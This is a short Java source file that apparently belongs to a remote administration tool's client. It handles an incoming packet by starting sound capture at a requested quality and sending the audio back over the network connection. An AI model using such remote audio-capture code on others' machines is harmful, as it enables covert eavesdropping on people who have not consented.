package com.redpois0n.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Sound;
import com.redpois0n.packets.outgoing.Header;

public class PacketSO extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.readLine().equalsIgnoreCase("true")) {
			int quality = Connection.readInt();
			Connection.write(Header.SOUND);
			Sound.initialize(quality);
			Sound.write();
		} else {
			Connection.write(Header.SOUND);
			Sound.write();
		}
	}

}
